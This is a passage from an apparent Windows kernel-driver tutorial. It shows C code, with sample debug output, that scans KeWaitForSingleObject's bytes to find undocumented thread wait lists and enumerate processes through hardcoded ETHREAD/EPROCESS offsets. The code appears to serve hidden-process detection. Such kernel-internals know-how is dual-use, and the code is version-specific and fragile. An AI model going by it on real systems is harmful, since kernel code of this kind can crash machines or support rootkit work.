style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 4096; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(*ptr
== 0xb9 &amp;&amp; *(ptr+5) == 0x84 &amp;&amp; *(ptr+6) == 0xc0 &amp;&amp;
*(ptr+24) == 0xb9)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitInListHead
= *(long *)(ptr + 1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *) gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;gKiWaitInListHead=%x
cur=%x %x&quot;,gKiWaitInListHead,cur,*start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= (long)cur + 388;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= *(long *)val;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>i
= (long)cur + 464;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>i
= *(long *)i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%d
%s cur=%x&quot;,val,i + 508,cur);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pethread
= (struct ETHREAD *)((long)cur - 92);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%d
%s Flink=%x &quot;,pethread-&gt;Cid.UniqueProcess,(char
*)pethread-&gt;ThreadsProcess+508,pethread-&gt;Tcb.WaitListEntry.Flink);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitInListHead=80482258
cur=81e8c27c 81e8c27c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>440
svchost.exe cur=81e8c27c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>440
svchost.exe Flink=81ebe25c <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>176
winlogon.exe cur=81ebe25c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>176
winlogon.exe Flink=81bb607c <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>952
Dfssvc.exe cur=81bb607c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>952
Dfssvc.exe Flink=816fbd5c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
above program really does not clarify a lot of issues in our mind. Thus lets
explain the same output in a slightly different way. The gKiWaitInListHead
pointer that we obtain is not a pointer to a undocumented structure ETHREAD.
There is a member WaitListEntry or 0x5c or 92 bytes from the start of the
structure that this variable points to. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
member WaitListEntry is a familiar LIST_ENTRY structure that builds a circular
linked list of threads that are waiting. The values of cur and *start are the
same as we assume that gKiWaitInListHead is a pointer to a LIST_ENTRY structure
and the first member is Flink. In the do loop, the variable curr is pointing 92
bytes from the start and if we subtract this value, we will come to the start
of the ETHREAD structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
can display the pid and name of the program owning this thread. To calculate
val we first added 388 to the value of cur. The reason we did that was that cur
is 92 bytes form the start and Cid is 480 bytes from the start. Thus from cur
Cid is 480-92 388 bytes. In the same vein the EPROCESS structure is 556 bytes
from the start and therefore 556-92 464 from cur. Thus it I simpler to
understand if we use a actual structure to access the members.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P56<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
gKiWaitOutListHead,i,val;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ptr,*namePtr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*cur, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr
= (unsigned char *) KeWaitForSingleObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 4096; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(*ptr
== 0xb9 &amp;&amp; *(ptr+5) == 0x84 &amp;&amp; *(ptr+6) == 0xc0 &amp;&amp;
*(ptr+24) == 0xb9)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitOutListHead
= *(long *)(ptr + 25);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%x&quot;,gKiWaitOutListHead);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitOutListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= *((long *)((long)cur + 388));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>namePtr
= (unsigned char *)(*((long *)((long)cur + 464))) + 508;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%d
%s&quot;,val,namePtr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>80482808<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>8
System<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>8
System<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>8
System<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
program once again displays a list of process but now uses another method. 24
bytes from the start of the pattern in the function code KeWaitForSingleObject
lies another pointer to LIST_ENTRY linked list of ETHREAD structures. We call
this the KiWaitOutListHead list. We do the same thing that we did earlier, scan
the link list and print out the pid at an offset 388 and the EPROCESS structure
464 bytes away. A little later we will talk about what these two different
lists signify.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P57<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
zzz<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
name[17];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
zzz procs[1000];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
zzz procs1[1000];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
nprocs,nprocs1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void
insert (long pid, char *nameptr) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
(i = 0; i &lt; nprocs; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(procs[i].pid == (long)pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>procs
[nprocs].pid = pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strcpy
(procs[nprocs].name, nameptr); <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nprocs++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void
insert1(long pid, char *nameptr) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
(i = 0; i &lt; nprocs1; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(procs1[i].pid == (long)pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>procs1[nprocs1].pid
= pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strcpy
(procs1[nprocs1].name, nameptr); <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nprocs1++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
